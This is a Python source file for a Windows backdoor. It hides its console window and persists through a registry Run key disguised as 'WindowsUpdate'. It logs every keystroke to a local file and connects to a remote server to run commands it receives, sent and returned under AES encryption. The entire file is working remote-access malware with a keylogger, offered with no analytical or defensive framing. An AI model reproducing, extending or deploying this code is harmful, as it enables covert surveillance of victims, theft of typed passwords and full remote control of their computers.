import socket
import subprocess
import os
import threading
import time
import winreg
from pynput.keyboard import Listener
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import sys

# ===== CONFIGURATION =====
SERVER_IP = '192.168.101.150'  # Replace with your server's IP
SERVER_PORT = 8080
KEY = b'ThisIsASecretKey1234567890abcdef'  # Must be 16, 24, or 32 bytes
IV = b'1234567890abcdef'  # 16 bytes for AES-CBC
KEYLOG_FILE = "keylog.txt"

# ===== ENCRYPTION FUNCTIONS =====
def encrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return base64.b64encode(cipher.encrypt(pad(data.encode(), AES.block_size)))

def decrypt(data):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher.decrypt(base64.b64decode(data)), AES.block_size).decode()

# ===== KEYLOGGER =====
def log_key(key):
    with open(KEYLOG_FILE, "a") as f:
        try:
            f.write(f"{key}\n")
        except:
            pass

def start_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

# ===== PERSISTENCE (REGISTRY) =====
def add_to_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except:
        pass

# ===== MAIN BACKDOOR =====
def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))
            
            while True:
                encrypted_command = client.recv(4096)
                if not encrypted_command:
                    break
                command = decrypt(encrypted_command)
                
                if command.lower() == 'exit':
                    client.close()
                    break
                elif command.lower().startswith('cd '):
                    try:
                        os.chdir(command[3:].strip())
                        client.send(encrypt(f"[+] Changed directory to: {os.getcwd()}"))
                    except Exception as e:
                        client.send(encrypt(f"[-] Error: {e}"))
                else:
                    try:
                        output = subprocess.getoutput(command)
                        client.send(encrypt(output))
                    except Exception as e:
                        client.send(encrypt(f"[-] Error: {e}"))
        except:
            time.sleep(10)  # Wait before reconnecting
            continue

# ===== START ALL THREADS =====
if __name__ == "__main__":
    # Hide console window (Windows only)
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    # Add to startup
    add_to_startup()

    # Start keylogger in background
    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
    keylogger_thread.start()

    # Start backdoor
    connect_to_server()
